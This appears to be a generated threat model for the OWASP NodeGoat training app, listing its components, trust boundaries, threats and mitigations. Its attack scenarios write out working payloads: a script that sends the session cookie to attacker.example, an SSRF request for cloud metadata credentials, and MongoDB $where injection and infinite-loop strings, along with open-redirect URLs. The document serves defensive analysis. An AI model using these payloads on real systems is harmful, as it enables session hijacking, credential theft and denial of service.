components.name: End User (Browser)
components.description: A person using the RetireEasy/NodeGoat web application through a browser: signs up, logs in, views dashboard, edits profile, contributions, allocations, memos and research.
assets: personal profile data (SSN, DOB, bank account, routing number)

components.name: NodeGoat Express Server
components.description: Express 4 application (server.js) serving HTML views rendered with swig/consolidate, handling login, signup, session management, profile, contributions, benefits, allocations, memos, research, learn redirect and the tutorial router. Mounts body-parser and express-session; helmet, csurf and dont-sniff-mimetype are commented out.

components.name: Session Handler / Login
components.description: SessionHandler in app/routes/session.js implements login, signup, logout and the isLoggedInMiddleware / isAdminUserMiddleware guards using express-session state (req.session.userId). Passwords are validated via UserDAO.validateLogin which compares plaintext with ===.

components.name: Mongo Data Access Layer (DAOs)
components.description: DAO modules that build and execute MongoDB queries for users, profiles, contributions, allocations, benefits and memos. AllocationsDAO builds a $where clause by string interpolation of the user-supplied threshold; ProfileDAO stores SSN/bank data unencrypted (encryption code commented out).
assets: SSN, date of birth, bank account and routing numbers

components.name: MongoDB (nodegoat)
components.description: MongoDB instance holding users, allocations, contributions, benefits and memos collections. Connection string comes from MONGODB_URI, defaulting to mongodb://localhost:27017/nodegoat; docker-compose runs mongo:4.4 with no authentication configured in the URI.
assets: SSN, DOB, bank account and routing numbers

components.name: Database Reset / Seed Script
components.description: artifacts/db-reset.js drops and repopulates collections with seed users (admin and two regular users) using plaintext passwords; run at container startup and on Heroku postdeploy.

components.name: External Stock Quote Site
components.description: Outbound HTTP target of the /research feature. The URL is built by concatenating the request-supplied url parameter (default https://finance.yahoo.com/quote/) with the symbol parameter and the response body is written back into the page.

components.name: Arbitrary Redirect Destination
components.description: Destination of the /learn redirect. The target URL is taken directly from the url query parameter with no allow-list, so it can be any external site.

components.name: Tutorial Pages
components.description: Unauthenticated tutorial router rendering static OWASP Top 10 explanation pages (a1..a10, redos, ssrf) at /tutorial and /tutorial/:page.

components.name: GitHub Actions CI
components.description: GitHub Actions workflows that lint the code and run Cypress end-to-end tests against the app with a disposable MongoDB container.

components.name: mongo (compose)
components.description: Deployment target (compose) mongo defined in docker-compose.yml.

components.name: web (compose)
components.description: Deployment target (compose) web defined in docker-compose.yml, ports 4000.

components.name: Dockerfile (dockerfile)
components.description: Deployment target (dockerfile) Dockerfile defined in Dockerfile, ports 4000.

trustBoundaries.name: Public Internet to Express application
trustBoundaries.description: Browsers reach the Express server on port 4000 over plain HTTP (HTTPS setup is commented out in server.js). Unauthenticated routes (/, /login, /signup, /logout, /tutorial) and session-authenticated routes are both exposed here, with no CSRF protection or security headers enabled.

trustBoundaries.name: Unauthenticated to authenticated application area
trustBoundaries.description: isLoggedInMiddleware promotes an anonymous visitor to an authenticated user based on req.session.userId. Beyond that point the application exposes no further role separation: the admin-only benefits pages and other users' allocations are reachable by any logged-in user.

trustBoundaries.name: Application to MongoDB
trustBoundaries.description: The Node process and the seed script connect to MongoDB via MONGODB_URI (mongodb://mongo:27017/nodegoat in docker-compose) with no credentials in the connection string; user passwords and financial identifiers cross this boundary in cleartext.

trustBoundaries.name: Application to third-party HTTP destinations
trustBoundaries.description: The /research handler makes server-side outbound requests to a host chosen by the request, and /learn redirects the user's browser to a request-supplied URL; both leave the application's control to arbitrary external endpoints.

trustBoundaries.name: CI pipeline to running application
trustBoundaries.description: GitHub Actions workflows build the application, start it with test configuration and a throwaway MongoDB container, and exercise it with Cypress using fixture accounts.

threats.title: Session cookie and rendered pages travel over plaintext HTTP
threats.asset: session cookie and personal profile data (SSN, bank account, routing number) in transit
threats.attackScenario: An attacker on the same Wi-Fi as an employee passively reads the app-renders-pages responses served by http.createServer(app) in server.js:145 — the HTTPS server and the cookie secure flag are both commented out (server.js:92-100, 149-155) — captures the connect.sid cookie from the Set-Cookie header of POST /login, and replays it to load /profile with the victim's SSN and bank account.
assumptions: No TLS-terminating proxy or load balancer sits in front of the Express server in the deployed environment.
TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
threats.impactReason: Full session takeover plus direct disclosure of SSN, DOB and bank details carried in cleartext.
threats.likelihoodReason: Requires network-adjacent position, but no application-level obstacle exists once there. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS and mark the session cookie secure and httpOnly.
steps: Uncomment the https.createServer block in server.js:149-155 or terminate TLS at a proxy and redirect HTTP to HTTPS.
Set cookie: { httpOnly: true, secure: true, maxAge: ... } in the express-session options at server.js:78-102.
Enable helmet.hsts() so browsers refuse plaintext on later visits.

threats.title: No security response headers on rendered HTML, so injected script runs unrestricted
threats.asset: session cookie and personal profile data (SSN, DOB, bank account, routing number) shown in the browser
threats.attackScenario: With helmet and dont-sniff-mimetype left commented out in server.js (lines 10, 14, 38-65) the responses on app-renders-pages carry no Content-Security-Policy, X-Frame-Options or X-Content-Type-Options, so an attacker who stores a script tag through POST /memos has it execute with no CSP to block it, or frames /profile in an invisible iframe and clickjacks the victim into submitting altered bank details.
assumptions: No reverse proxy or CDN in front of the Express server injects these headers.
threats.impactReason: Absent CSP and frame protection turn any injection or UI-redress trick into full session and profile data theft.
threats.likelihoodReason: Every HTML response on this flow is affected and the memos and profile pages are reachable by any logged-in user.

mitigation.summary: Enable helmet with CSP, frameguard and nosniff on all rendered responses.
steps: Uncomment the helmet requires and app.use(helmet.*) block in server.js (lines 10, 38-65); helmet is already a dependency in package.json.
Add helmet.contentSecurityPolicy with a script-src that excludes 'unsafe-inline', plus frameguard, hsts and noSniff.
Set swig autoescape back to true in server.js:135-142 so template output is escaped before it reaches the browser.

threats.title: Cross-site request forgery drives state-changing DAO writes for profile, contributions, benefits and memos
threats.asset: user profile records including SSN, bank account and routing numbers
threats.attackScenario: Cookie-based express-session authenticates POST /profile and no CSRF token is checked, so an attacker hosts a page that auto-submits a form to https://<nodegoat-host>/profile with attacker-chosen bankAcc and bankRouting fields; the victim's browser sends the session cookie, the handler reaches profileDAO.updateUser over the app-to-dao flow, and the victim's banking details are overwritten.
assumptions: The session cookie is sent on cross-site form POSTs, i.e. it is not set with SameSite=Lax or Strict.
threats.impactReason: An attacker can silently rewrite profile bank account and routing numbers, contribution percentages and benefit start dates for any logged-in victim.
threats.likelihoodReason: Requires only that a logged-in user loads an attacker-controlled page; the csurf dependency is present but unused.

mitigation.summary: Enable CSRF token validation on all state-changing routes.
steps: Uncomment the csurf require in server.js and register app.use(csrf()) after the express-session middleware.
Emit the token into each form template (profile, contributions, benefits, memos, login, signup) as a hidden _csrf field.
Set the session cookie with sameSite: "strict" and httpOnly: true in the express-session options.

threats.title: Unvalidated userId and threshold flow from the /allocations/:userId request into the AllocationsDAO query
threats.asset: other users' retirement allocation records
threats.attackScenario: app/routes/allocations.js takes userId from req.params and threshold from req.query and hands both to allocationsDAO.getByUserIdAndThreshold with no ownership check on the route, so any registered user requests GET /allocations/2?threshold=0 and the DAO call returns another employee's stocks, funds and bonds allocations to them.
assumptions: User ids are small sequential integers generated by the counters collection, so neighbouring ids are trivially guessable.
threats.impactReason: Every user's allocation record, together with the user name and real name added by the DAO, is readable one id at a time.
threats.likelihoodReason: Any self-registered account passes the isLoggedIn middleware and can walk the id space with plain GET requests.

mitigation.summary: Scope the DAO call to the session's own user id.
steps: In app/routes/allocations.js, read userId from req.session instead of req.params (the fix is already sketched in the commented block at lines 12-15).
If a path parameter must remain, compare it to req.session.userId and return 404 when they differ before calling allocationsDAO.getByUserIdAndThreshold.
Coerce threshold with parseInt and reject non-numeric values before passing it to the DAO.

threats.title: Open redirect on GET /learn sends authenticated users to attacker-controlled sites
threats.asset: user credentials and session cookies harvested through a phishing page reached from a trusted link
threats.attackScenario: app/routes/index.js:72 passes req.query.url straight into res.redirect with no allow-list, so an attacker mails employees a link to https://<nodegoat-host>/learn?url=https://nodegoat-login.attacker.tld, the server answers 302 to the attacker's cloned login page, and the victim types their NodeGoat username and password into it.
threats.impactReason: Credentials phished this way give full access to profile SSN, date of birth and bank account data held by the application.
threats.likelihoodReason: The redirect requires only a crafted URL and a logged-in victim clicking it; the vulnerable parameter is directly attacker-controlled and the pattern is documented in the app's own tutorial page.

mitigation.summary: Restrict /learn to an allow-list of destinations.
steps: Replace `res.redirect(req.query.url)` at app/routes/index.js:72 with a lookup that maps a short key (for example ?resource=owasp-top10) to a hardcoded URL from a server-side table.
If full URLs must stay, parse the value with the Node `url` module and reject anything whose host is not in an explicit allow-list, returning 400.
Never pass the raw query value into res.redirect.

threats.title: Missing security response headers let a redirected page frame or script against the NodeGoat origin
threats.asset: session cookies and rendered NodeGoat pages
threats.attackScenario: No helmet middleware or header configuration is applied to the Express app, so once a user follows /learn?url=... to an attacker page, that page frames the NodeGoat dashboard (no X-Frame-Options/frame-ancestors) and clickjacks the victim into submitting the /profile or /benefits form on the trusted origin.
assumptions: No reverse proxy in front of the Express server injects frame-ancestors or Content-Security-Policy headers.
TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
threats.impactReason: Framing and the absence of a content security policy let an attacker page drive state-changing actions on behalf of the logged-in user.
threats.likelihoodReason: Requires the victim to visit the attacker page, which the open redirect on /learn makes straightforward. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable the helmet middleware that is already a declared dependency.
steps: Uncomment and register helmet in server.js (frameguard, contentSecurityPolicy, hsts, noSniff) before the routes are mounted.
Disable the x-powered-by header with app.disable("x-powered-by").

threats.title: Unvalidated req.query.url on GET /learn also allows scheme-based payloads in the redirect target
threats.asset: user browser navigation from the NodeGoat origin
threats.attackScenario: The /learn handler at app/routes/index.js:70 reads req.query.url without any validation library or scheme check, so an attacker supplies /learn?url=//evil.tld%2f%2e%2e or a javascript:/data: style value and the Location header emitted by the server carries whatever string the attacker chose, including protocol-relative hosts that bypass naive path checks.
assumptions: No upstream middleware normalises or whitelists the url query parameter before the handler runs.
threats.impactReason: The attacker fully controls the Location header value for a trusted origin, enabling protocol-relative and scheme-confusion navigation of the victim's browser.
threats.likelihoodReason: Any logged-in user visiting a crafted link triggers it; no special position is required.

mitigation.summary: Validate the url parameter before redirecting.
steps: Add an explicit check in app/routes/index.js:70-73 that the parsed value uses https: and a host present in a configured allow-list.
Reject with 400 for any other value instead of falling through to res.redirect.

threats.title: Cookie-authenticated state changes reached through the session handler flow accept cross-site requests
threats.asset: the victim's retirement contribution percentages and profile bank details
threats.attackScenario: Route handlers on app-to-session-handler authenticate purely from the session cookie with no CSRF token, despite csurf being a declared dependency, so an attacker hosts a page that auto-submits a form to POST /contributions (app/routes/index.js:52) and any logged-in victim who visits it silently rewrites their own contribution percentages, and the same trick against POST /login logs the victim into the attacker's account.
assumptions: The session cookie is sent on cross-site form POSTs, i.e. SameSite is not set to Lax or Strict on the express-session cookie.
threats.impactReason: An attacker can alter a victim's contributions, profile and benefits records, but cannot read the responses back.
threats.likelihoodReason: Only requires luring an authenticated user to a page; all state-changing routes are simple form POSTs with no token.

mitigation.summary: Enable the csurf middleware already in package.json across state-changing routes.
steps: Uncomment and mount `csrf()` in server.js after the express-session middleware.
Emit the token into every form in app/views and verify it on POST /login, /signup, /profile, /contributions, /benefits and /memos.
Set `sameSite: 'lax'` on the express-session cookie in server.js as defence in depth.

threats.title: Login and signup credentials travel to the session handler alongside a hardcoded cookie secret that lets sessions be forged
threats.asset: session cookies and the session identifiers they carry
threats.attackScenario: The session established by the login handler on app-to-session-handler is signed with the `cookieSecret` literal committed at config/env/all.js:8, so an attacker who reads the public repository signs their own `connect.sid` value for an arbitrary userId and presents it to GET /dashboard (app/routes/index.js:44), passing isLoggedInMiddleware without ever knowing a password.
assumptions: The deployed instance uses the committed config/env/all.js cookieSecret rather than an environment-supplied override.
threats.impactReason: A forged signed cookie impersonates any user, exposing their contributions, allocations, benefits and profile data.
threats.likelihoodReason: The secret is a source-code literal, but forging a session still requires knowing the session store layout and a valid userId.

mitigation.summary: Load the cookie secret from the environment and rotate the committed value.
steps: Change config/env/all.js:8 to `cookieSecret: process.env.COOKIE_SECRET` and fail startup in server.js when it is unset.
Generate a new random secret and invalidate all existing sessions.
Remove the literal from git history so the old value cannot be recovered.

threats.title: Credential data flowing to the session handler is compared as a plaintext string, exposing stored passwords
threats.asset: stored user passwords
threats.attackScenario: The login and signup credential data carried on app-to-session-handler ends at UserDAO, which stores `password` verbatim in the users document (app/data/user-dao.js:25) and validates with `fromDB === fromUser` (app/data/user-dao.js:61) instead of the bcrypt-nodejs dependency already imported, so anyone who reaches the Mongo users collection — through a database dump, backup or the SSRF on /research — reads every account's cleartext password and reuses it on other services.
assumptions: The hashing fix commented out at app/data/user-dao.js:29 is not applied anywhere else before the document is inserted.
threats.impactReason: Every user's password is recoverable in cleartext, enabling full account takeover here and credential stuffing elsewhere.
threats.likelihoodReason: No exploitation skill is needed once any read access to the users collection is obtained, and the application offers several paths toward internal services.

mitigation.summary: Hash passwords with the bcrypt-nodejs dependency already present.
steps: In app/data/user-dao.js:25 store `bcrypt.hashSync(password, bcrypt.genSaltSync())` instead of the raw password.
Replace the `fromDB === fromUser` comparison at app/data/user-dao.js:61 with `bcrypt.compareSync(fromUser, fromDB)` in the correct argument order.
Force a password reset for existing accounts so no cleartext values remain.

threats.title: SSRF on the outbound stock-quote flow: attacker-chosen host in GET /research?url=
threats.asset: internal network services and cloud instance metadata credentials reachable from the app server
threats.attackScenario: The app-to-stock-service flow builds its target as `req.query.url + req.query.symbol` at app/routes/research.js:15 with no host allow-list, so an authenticated attacker requests GET /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=role and the server fetches the metadata endpoint and echoes the body back through res.write(body), handing the attacker instance credentials instead of a Yahoo Finance quote.
threats.impactReason: The outbound request originates inside the server's network and the full response body is returned to the caller, exposing internal-only services and any cloud metadata credentials.
threats.likelihoodReason: Any registered user reaches GET /research, the url parameter is a plain hidden form field trivially overridden in the query string, and the response is reflected verbatim.

mitigation.summary: Pin the outbound host and pass only an encoded symbol.
steps: Replace `const url = req.query.url + req.query.symbol` in app/routes/research.js:15 with a constant base URL plus `encodeURIComponent(req.query.symbol)`.
Drop the hidden `url` input from app/views/research.html so the client never supplies a host.
If a configurable host is genuinely needed, validate the parsed hostname against a fixed allow-list before calling needle.get.

threats.title: Third-party HTML fetched over the stock-quote flow is written unmodified into the /research response
threats.asset: session cookies and the authenticated user's retirement contribution and allocation data
threats.attackScenario: The response carried back on app-to-stock-service is written straight into the page with `res.write(body)` at app/routes/research.js:25 under Content-Type text/html and no escaping or content security policy, so an attacker sends a victim a link to GET /research?url=https://attacker.example/&symbol=x whose page returns `<script>fetch('https://attacker.example/x?c='+document.cookie)</script>`, which executes on the application's origin and exfiltrates the victim's session cookie.
assumptions: The session cookie is not set httpOnly, or the injected script is used to drive authenticated requests rather than read the cookie directly.
threats.impactReason: Script executing on the app origin can read the dashboard, contributions and allocations pages and post state changes as the victim.
threats.likelihoodReason: The attacker controls both the fetched host and the returned markup, and only needs the victim to click a /research link while logged in; no CSP is present to blunt it.

mitigation.summary: Never echo fetched third-party bodies as HTML on the app origin.
steps: In app/routes/research.js, parse the needle response and render only the extracted quote values through the swig template instead of res.write(body).
If raw content must be shown, serve it with Content-Type text/plain or from a sandboxed iframe on a separate origin.
Enable the already-declared helmet dependency in server.js and set a contentSecurityPolicy that forbids inline script.

threats.title: Unbounded outbound fetch on /research lets an attacker stall or exhaust the server
threats.asset: availability of the NodeGoat application to legitimate users
threats.attackScenario: needle.get on app-to-stock-service at app/routes/research.js:16 is called with no timeout, response size limit or concurrency cap, so an attacker repeatedly calls GET /research?url=http://attacker.example/slowloris&symbol=x pointing at a host that trickles bytes forever, pinning Node sockets and memory until the app stops serving the dashboard.
assumptions: No reverse proxy or rate limiter caps concurrent /research requests in front of the Express server.
threats.impactReason: Sustained socket and buffer exhaustion degrades or halts the single-process Express server for all users, but no data is lost.
threats.likelihoodReason: Requires an authenticated session, but the attacker fully controls the destination host and its response behaviour and can repeat the request cheaply.

mitigation.summary: Bound the outbound request in time and size.
steps: Pass needle options `{ open_timeout: 3000, response_timeout: 5000, read_timeout: 5000 }` to the needle.get call in app/routes/research.js:16.
Cap the accepted body length and abort the request past the cap before writing it to the response.
Apply a per-session request limit to GET /research in app/routes/index.js:76.

threats.title: CI workflow runs the app over plaintext HTTP with fixture credentials typed into the login form
threats.asset: test fixture credentials (admin.json / user.json)
threats.attackScenario: The e2e workflow starts the app with `NODE_ENV=test npm start` at .github/workflows/e2e-test.yml:46 and Cypress drives it over plain HTTP, typing the admin fixture password into #password (test/e2e/support/commands.js:6-8); anyone with access to the runner network namespace or a malicious step/dependency pulled in by `npm ci` can sniff or replay the localhost HTTP login request to capture the admin fixture credentials and the resulting session cookie.
assumptions: TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
The CI job drives the app over unencrypted HTTP on the runner, since server.js's HTTPS setup is commented out.
The fixture admin account password is reused or resembles credentials used elsewhere.
threats.impactReason: Only disposable test fixture credentials and a short-lived session on an ephemeral MongoDB container are exposed.
threats.likelihoodReason: Requires code execution on the runner (e.g. a malicious dependency or a pull-request-triggered workflow), which is reachable but not trivial. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Keep CI credentials disposable and isolate the e2e run from untrusted code.
steps: Confirm test/e2e/fixtures/users/*.json contain throwaway values never used outside CI.
Pin third-party actions by commit SHA in .github/workflows/e2e-test.yml instead of floating tags such as actions/checkout@v2.
Run the e2e job with `pull_request` (not `pull_request_target`) so fork code never receives repository secrets.

threats.title: No CSRF protection on the app exercised over the ci-runs-app flow, allowing forged POST /login and POST /profile
threats.asset: user profile data (SSN, bank account, routing number) and session identity
threats.attackScenario: The app reached over ci-runs-app uses cookie sessions and accepts state-changing POSTs such as POST /login (app/routes/index.js:34) and POST /profile with no CSRF token, so an attacker hosts a page that auto-submits a form to /profile and silently overwrites a logged-in victim's ssn, bankAcc and bankRouting fields, or logs the victim into an attacker-controlled account via login CSRF.
assumptions: csurf, although declared in package.json, is not mounted anywhere upstream of the routes in the running app.
threats.impactReason: Forged requests can rewrite highly sensitive profile fields and contribution percentages under the victim's session.
threats.likelihoodReason: Any external site can trigger the request against a logged-in browser; no attacker privileges are required.

mitigation.summary: Mount CSRF protection using the already-declared csurf dependency.
steps: Uncomment `const csrf = require('csurf')` in server.js and `app.use(csrf())` after the session middleware.
Render `_csrf` as a hidden input in every state-changing form template (login, signup, profile, contributions, benefits, memos).
Set `sameSite: 'strict'` on the express-session cookie in server.js as a second layer.

threats.title: Missing security response headers on the HTTP responses carried by ci-runs-app
threats.asset: session cookies and rendered retirement/benefits data
threats.attackScenario: Responses on the ci-runs-app flow carry no Content-Security-Policy, X-Frame-Options or HSTS because helmet is required only in a comment in server.js:10, so an attacker who lands stored markup through POST /memos gets unrestricted inline script execution, or frames /allocations/:userId in a hidden iframe to clickjack a logged-in employee into acting on their retirement allocations.
assumptions: No reverse proxy in front of the Express server injects these headers.
TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
threats.impactReason: Absent CSP and frame protection amplify any injection into full script execution against session cookies and rendered financial data.
threats.likelihoodReason: Every response over the flow lacks the headers and the app already renders user-supplied memo content. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable helmet, which is already a declared dependency.
steps: Uncomment `const helmet = require("helmet")` and `app.use(helmet())` in server.js, including frameguard, contentSecurityPolicy and hsts.
Call `app.disable("x-powered-by")` in server.js.
Define a CSP that forbids inline script so injected memo content cannot execute.

threats.title: Open redirect on GET /learn reachable over ci-runs-app
threats.asset: user credentials harvested via a spoofed login page
threats.attackScenario: GET /learn at app/routes/index.js:70-73 passes req.query.url straight into res.redirect with no allowlist or validation, so an attacker mails an employee a link to /learn?url=https://evil.example/login that arrives from the trusted application origin and lands on a cloned NodeGoat login page that captures their username and password.
assumptions: No upstream middleware rewrites or validates req.query.url before the handler runs.
threats.impactReason: Credential phishing from a trusted origin leads to full account takeover of employee retirement accounts.
threats.likelihoodReason: The handler performs no validation at all and the parameter is fully attacker-controlled; only a logged-in victim clicking the link is needed.

mitigation.summary: Restrict /learn redirects to a known allowlist of destinations.
steps: In app/routes/index.js:70, parse req.query.url and reject any value whose host is not in an explicit allowlist, returning 400 otherwise.
Prefer mapping a short key (e.g. ?topic=a1) to a server-side URL table instead of accepting a full URL.

threats.title: Unpinned third-party GitHub Actions and unverified npm install let CI tamper with the app under test
threats.asset: build artifacts and the code path executed in CI
threats.attackScenario: Every step in .github/workflows/e2e-test.yml and lint.yml references mutable tags (actions/checkout@v2, actions/setup-node@v1, actions/cache@v2) and lint.yml:26 fetches `jshint@2.12.0` from the network at run time, so an attacker who compromises one of those tags or the npm registry entry gets arbitrary code execution inside the job that then starts the app at line 46 and can modify test results or exfiltrate the runner's GITHUB_TOKEN.
assumptions: The workflows still resolve these actions and the jshint package at run time rather than from a vendored, checksum-verified copy.
threats.impactReason: Arbitrary code in the job can alter build artifacts and reach the job token, though this repository is a deliberately vulnerable training app.
threats.likelihoodReason: Supply-chain compromise of a popular action or package is possible but not routine; no attacker-controlled input is needed beyond that.

mitigation.summary: Pin all actions and tooling to immutable versions.
steps: Replace @v1/@v2 action references in .github/workflows/e2e-test.yml and .github/workflows/lint.yml with full commit SHAs.
Add jshint to devDependencies and run it via `npx --no-install` against the locked tree rather than fetching it from the registry.
Set `permissions:` to the minimum (contents: read) at the top of both workflows.

threats.title: Cypress failure artifacts uploaded from CI can leak session cookies and fixture logins in video and screenshots
threats.asset: test fixture credentials and recorded application screens
threats.attackScenario: The workflow runs `npm run test:ci -- --config video=true` at .github/workflows/e2e-test.yml:47 and on failure uploads the screenshots and videos folders as the artifact `cypress-artifacts-node${{ matrix.node-version }}` (lines 49-60), so anyone able to download workflow artifacts from the repository can replay the recording of cy.signIn typing the admin fixture password into #password and read any data the app rendered during the run.
assumptions: Workflow artifacts are downloadable by anyone with read access to the repository, including for fork pull requests.
threats.impactReason: Recordings expose fixture account passwords and whatever seeded personal data the app renders, but not production secrets.
threats.likelihoodReason: Artifacts are produced automatically on every failing run and are downloadable without any special position.

mitigation.summary: Stop recording credential entry and limit artifact retention.
steps: Use `cy.get('#password').type(pw, { log: false })` in test/e2e/support/commands.js so the password is not rendered in the Cypress command log.
Set a short `retention-days` on the actions/upload-artifact step in .github/workflows/e2e-test.yml.
Drop `--config video=true` and upload screenshots only, or scrub the login spec from recordings.

threats.title: Unauthenticated request flooding of the app started by CI has no rate limiting or body size cap
threats.asset: availability of the NodeGoat Express server
threats.attackScenario: With no rate limiting in front of the Express server reached over ci-runs-app, an attacker repeatedly posts to /login with oversized userName bodies or to /profile with a bankRouting value such as a long run of digits that hits the catastrophic-backtracking regex at app/routes/profile.js:59, pinning the single Node.js event loop and making the app unavailable to all users.
assumptions: No rate limiter or request body size limit is applied in front of the Express server.
The application runs as a single Node process with no autoscaling or WAF.
threats.impactReason: A single crafted request can consume all CPU on the single-threaded server, denying service to every user.
threats.likelihoodReason: The routes are reachable with only a low-privilege account (or none for /login) and the ReDoS pattern is trivially triggered.

mitigation.summary: Add request rate limiting, body size limits and fix the backtracking regex.
steps: Replace `/([0-9]+)+\#/` with `/([0-9]+)\#/` at app/routes/profile.js:59 to remove the nested quantifier.
Configure explicit `limit` options on the body-parser middleware in server.js.
Add a rate limiter in front of POST /login and POST /profile in server.js.

threats.title: Cleartext SSN, bank details and passwords traverse the unauthenticated MongoDB wire protocol
threats.asset: SSN, date of birth, bank account and routing numbers and plaintext passwords in transit to MongoDB
threats.attackScenario: The dao-to-mongo flow uses the URI mongodb://mongo:27017/nodegoat from docker-compose.yml:8 with no tls option and no credentials, so an attacker with a foothold on the docker bridge network reads the wire-protocol insert carrying ssn, bankAcc and the plaintext password from ProfileDAO/UserDAO, or connects to mongo:27017 themselves and writes directly to the users collection.
assumptions: Encryption at rest is not enabled, so sensitive fields are stored in plaintext given the ProfileDAO encryption code is commented out.
MongoDB has no authentication configured, matching the credential-less connection string in docker-compose.yml.
The deployment uses the docker-compose MONGODB_URI as written, with no TLS terminator or authenticated user injected at runtime.
threats.impactReason: Every sensitive field the application stores is exposed in cleartext on the wire and writable by anyone who can reach the port.
threats.likelihoodReason: Requires network adjacency to the container network, but no credential or TLS barrier stands in the way once there. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies; no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and TLS on the MongoDB connection.
steps: Create a least-privilege MongoDB user and put its credentials in MONGODB_URI via a secret rather than the literal in docker-compose.yml:8.
Start mongo with --auth and --tlsMode requireTLS and add tls=true plus a CA file to the connection string used by MongoClient.connect in server.js:30.
Restrict the mongo service to an internal docker network and never publish 27017.

threats.title: Injected $where JavaScript stalls the MongoDB server and denies service to all users
threats.asset: availability of the nodegoat MongoDB instance and all application data access
threats.attackScenario: Because the threshold string is interpolated into the $where expression at app/data/allocations-dao.js:78 and sent over the dao-to-mongo flow unchanged, an attacker submits threshold=0';while(true){}' on the allocations request and the MongoDB JavaScript engine spins indefinitely, blocking the shared connection and starving every other DAO query of service.
assumptions: No server-side JavaScript execution timeout or maxTimeMS is configured for the allocations query.
threats.impactReason: A single request can render the database unresponsive for the whole application until the server is restarted.
threats.likelihoodReason: The payload is a one-line request parameter and the injection point is confirmed in code.

mitigation.summary: Eliminate $where on the allocations query and bound query execution time.
steps: Replace the $where expression in app/data/allocations-dao.js with {userId: parsedUserId, stocks: {$gt: parsedThreshold}}.
Disable server-side JavaScript on the mongo service with --noscripting in docker-compose.yml.
Apply maxTimeMS to the allocations find call so no query can run unbounded.

threats.title: Login passwords stored and compared in plaintext in UserDAO
threats.asset: stored user passwords in the users collection
threats.attackScenario: UserDAO.validateLogin compares the submitted password to the stored value with === at app/data/user-dao.js:61, proving passwords are written to the users collection in cleartext, so anyone who reads the users collection (for example via the $where injection in allocations-dao.js or direct access to the mongo container) immediately obtains every account's usable password rather than a hash.
assumptions: Encryption at rest is not enabled, so sensitive fields are stored in plaintext given the ProfileDAO encryption code is commented out.
MongoDB has no authentication configured, matching the credential-less connection string in docker-compose.yml.
threats.impactReason: All account credentials are recoverable verbatim, enabling full account takeover and credential reuse against other sites.
threats.likelihoodReason: The plaintext storage is certain from the comparison code; exploitation only needs any read path into the users collection, several of which exist in this application. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies; no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Hash passwords with bcrypt on write and verify with a constant-time compare on login.
steps: Use the already-declared bcrypt-nodejs dependency to hashSync the password in UserDAO.addUser before insert in app/data/user-dao.js.
Replace the === comparison at app/data/user-dao.js:61 with bcrypt.compareSync(fromUser, fromDB).
Migrate existing plaintext password values by rehashing them on next successful login and clearing the plaintext field.

threats.title: Server-side JavaScript injection through the allocations threshold parameter
threats.asset: allocations documents and any other collection data reachable from the $where evaluation context
threats.attackScenario: AllocationsDAO.getByUserIdAndThreshold interpolates the raw threshold string into a MongoDB $where JavaScript expression at app/data/allocations-dao.js:78, so an attacker requests the allocations view with threshold=1'; return 1 == '1 to make the predicate always true and return every user's allocation rows, or sends 0';while(true){}' to pin the MongoDB JavaScript engine in an infinite loop.
assumptions: The threshold value reaches the DAO directly from an HTTP request parameter without prior numeric coercion in the route handler.
threats.impactReason: Injected JavaScript executes inside the database process, allowing arbitrary predicate control over the allocations collection and a trivial denial of service on the database.
threats.likelihoodReason: The parameter is directly attacker-controlled by any logged-in user and the payloads are documented in the file's own comments.

mitigation.summary: Replace the $where clause with typed query operators and validate the threshold.
steps: Coerce threshold with parseInt(threshold, 10) and reject values outside the expected range before building any query in app/data/allocations-dao.js.
Replace the $where expression at app/data/allocations-dao.js:78 with a standard query document such as {userId: parsedUserId, stocks: {$gt: parsedThreshold}}.
Ensure the route passing threshold rejects non-numeric input before calling getByUserIdAndThreshold.

threats.title: Profile and benefits writes through the DAOs leave no audit trail
threats.asset: integrity record of changes to SSN, bank routing numbers and benefit start dates
threats.attackScenario: ProfileDAO.updateUser and BenefitsDAO.updateBenefits overwrite bankAcc, bankRouting and benefitStartDate with only a console.log("Updated benefits") at app/data/benefits-dao.js:33 and no actor, timestamp or prior-value record, so an attacker who rides a logged-in admin's session (there is no CSRF token on the state-changing routes) redirects a victim's bank routing number and the operator cannot later attribute or reconstruct the change.
assumptions: No external audit logging layer wraps the DAO write methods.
threats.impactReason: Fraudulent changes to bank details and benefit dates cannot be attributed to an actor or rolled back to a prior value.
threats.likelihoodReason: Any state-changing profile or benefits request that succeeds leaves no trace, and the missing CSRF control makes such requests reachable from an attacker-controlled page.

mitigation.summary: Record an append-only audit entry for every sensitive DAO write.
steps: Add an audit collection and write {actorUserId, targetUserId, field, previousValue hash, newValue hash, timestamp} inside ProfileDAO.updateUser and BenefitsDAO.updateBenefits.
Replace the console.log calls in app/data/benefits-dao.js with structured log output that includes the acting session user id.
Enable the already-declared csurf dependency so state-changing writes reaching the DAOs carry a verified token.

threats.title: SSN, date of birth and bank details persisted unencrypted by ProfileDAO
threats.asset: customer SSN, date of birth, bank account and routing numbers
threats.attackScenario: ProfileDAO.updateUser writes ssn, dob, bankAcc and bankRouting straight into the users collection at app/data/profile-dao.js:42-60 while the crypto encrypt/decrypt helpers sit commented out at lines 15-40, so an attacker who obtains any read into the users collection — for example through the allocations $where injection or by reaching mongo directly — dumps full SSNs and bank routing numbers in cleartext.
assumptions: Encryption at rest is not enabled, so sensitive fields are stored in plaintext given the ProfileDAO encryption code is commented out.
The commented-out encrypt/decrypt block is the only field-level protection the application ever had, and no encryption is applied elsewhere before the write.
threats.impactReason: SSN, DOB and bank account/routing numbers are directly usable for identity theft and financial fraud for every profile in the collection.
